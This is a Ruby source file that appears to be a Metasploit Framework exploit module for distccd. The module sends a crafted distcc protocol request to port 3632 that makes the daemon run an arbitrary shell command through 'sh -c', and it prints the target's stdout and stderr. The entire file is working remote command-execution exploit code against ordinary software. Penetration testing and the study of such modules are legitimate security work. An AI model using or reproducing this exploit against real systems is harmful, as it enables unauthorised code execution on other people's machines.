##
# $Id: distcc_exec.rb 4498 2007-03-01 08:21:36Z mmiller $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Exploits::Unix::Misc::DISTCCD_EXEC < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'DistCC Daemon Command Execution',
			'Description'    => %q{
				This module uses a documented security weakness to execute
				arbitrary commands on any system running distccd.
					
			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 4498 $',
			'References'     =>
				[
					[ 'MIL', '19'],
					[ 'URL', 'http://distcc.samba.org/security.html'],

				],
			'Platform'       => ['unix'],
			'Arch'           => ARCH_CMD,				
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'       => 1024,
					'DisableNops' => true,
				},
			'Targets'        => 
				[
					[ 'Automatic Target', { }]
				],
			'DefaultTarget' => 0))
			
			register_options(
				[
					Opt::RPORT(3632)
				], self.class)			
	end

	def exploit
		connect

		distcmd = dist_cmd("sh", "-c", payload.encoded);
		sock.put(distcmd)
		
		dtag = rand_text_alphanumeric(10)
		sock.put("DOTI0000000A#{dtag}\n")
		
		res = sock.get_once(24, 5)
		
		if (not (res and res.length == 24))
			print_status("The remote distccd did not reply to our request")
			disconnect
			return
		end
		
		# Check STDERR
		res = sock.get_once(4, 5)
		res = sock.get_once(8, 5)
		len = [res].pack("H*").unpack("N")[0]
		
		if (len > 0)
			res = sock.get_once(len, 5)
			res.split("\n").each do |line|
				print_status("stderr: #{line}")
			end
		end

		# Check STDOUT
		res = sock.get_once(4, 5)
		res = sock.get_once(8, 5)
		len = [res].pack("H*").unpack("N")[0]
		
		if (len > 0)
			res = sock.get_once(len, 5)
			res.split("\n").each do |line|
				print_status("stdout: #{line}")
			end
		end
				
		handler
		disconnect
	end
	
	
	# Generate a distccd command
	def dist_cmd(*args)
	
		# Convince distccd that this is a compile
		args.concat(%w{# -c main.c -o main.o})
		
		# Set distcc 'magic fairy dust' and argument count
		res = "DIST00000001" + sprintf("ARGC%.8x", args.length)
		
		# Set the command arguments
		args.each do |arg|
			res << sprintf("ARGV%.8x%s", arg.length, arg)
		end
		
		return res
	end

end
end	
